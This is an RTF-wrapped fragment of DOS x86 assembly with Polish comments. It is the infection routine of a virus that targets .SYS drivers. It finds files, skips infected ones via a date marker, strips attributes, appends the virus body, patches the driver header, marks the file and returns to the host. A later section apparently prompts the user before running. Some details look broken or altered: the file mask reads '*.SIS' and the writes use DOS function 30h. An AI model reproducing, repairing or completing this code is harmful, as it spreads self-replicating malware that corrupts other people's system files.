\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA]                 ; miejsca gdzie bedzie nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][MaskaSYS]                ; maska poszukiwanych plikow '*.SYS'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Atrybut                       ; podaj atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Eh                           ; funkcja DOS - szukaj pierwszej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    NieMaPlikuSYS                    ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KolejnyPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   [si][NoweDTA.DTADate],VZnacznik  ; czy znaleziony plik jest juz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zarazony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    SzukajNastepnyPlik               ; tak = szukaj nastepny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][NoweDTA.DTASize+2]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pobierz starsza czesc dlugosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    ax,ax                            ; czy plik krotszy niz 65536 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnz   SzukajNastepnyPlik               ; nie - szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][NoweDTA.DTASize]; pobierz dlugosc pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,64000                         ; czy dlugosc <= 64000 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ja    SzukajNastepnyPlik               ; nie - szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3D02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,size NAGL                     ; ilosc czytanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][CzytNAGL]                ; podaj dokad czytac 3 bajty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Fh                           ; funkcja DOS - czytaj z pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][CzytNagl.NaglAdres]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; wez 4 bajty z pliku do AX i DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,word ptr [si][CzytNagl.NaglAdres+2]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,0FFFFh                        ; czy AX=0FFFFh ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZamknijPlik                      ; NIE - szukaj innego plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ax,dx                            ; czy AX=DX=0FFFFh ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jne   ZamknijPlik                      ; NIE - szukaj inny plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; TAK - na poczatku pliku jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; 0FFFFFFFFh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,word ptr [si][CzytNagl.NaglPrzerwanie]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][StarePrzerwanie],ax         ; wez adres przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ zeruj CX:DX zawierajace}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem konca pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4202h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na koniec pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   [si][CzytNAGL.NaglPrzerwanie],ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,VirusDlug                     ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][VirusStart]              ; podaj skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   cx,cx                            ; \\ CX:DX zawieraja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor   dx,dx                            ; / adres wzgledem poczatku pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4200h                         ; funkcja DOS - zmien wskaznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; odczytu/zapisu na poczatek pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1 to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,size NAGL                     ; ilosc zapisywanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][CzytNAGL]                ; podaj skad zapisac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,[si][NoweDTA.DTATime]         ; przywroc czas z bufora DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,[si][NoweDTA.DTAAttr]         ; podaj stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ch,0                             ; CX=CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,[si][NoweDTA.DTAName]         ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajNastepnyPlik:                        ; poprzedni plik byl zarazony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Fh                           ; funkcja DOS - szukaj innego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pliku SYS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   KolejnyPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaPlikuSYS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lds   dx, dword ptr cs:[si][DTASegOfs] ; przywroc pierwotne DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,1Ah                           ; funkcja DOS - ustaw nowe DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BezInfekcji:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    es                              ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    ds                              ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    di                              ;   \\    przywroc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    si                              ;    \\   zmieniane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    dx                              ;    /   rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    cx                              ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    bx                              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    ax                              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db 0EAh                                ; powrot do nosiciela}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     SkokIP dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     SkokCS dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MaskaSYS       db '*.SIS'                  ; maska plikow SYS (ASCIIZ)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Czesc Informayjna                        ; wyswietla pytanie do uzytkownika}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacja:                                ; czy chce uruchomic wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cld}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov  si,dx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lods  byte ptr cs:[si]                ; kolejny znak komunikatu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    al,al                           ; czy koniec tekstu ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    InformacjaTxtOK                 ; TAK - koniec pisania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0Eh                          ; pisz znak z AL}{\f2\fs24\lang1045{\*\listtag0}\par}
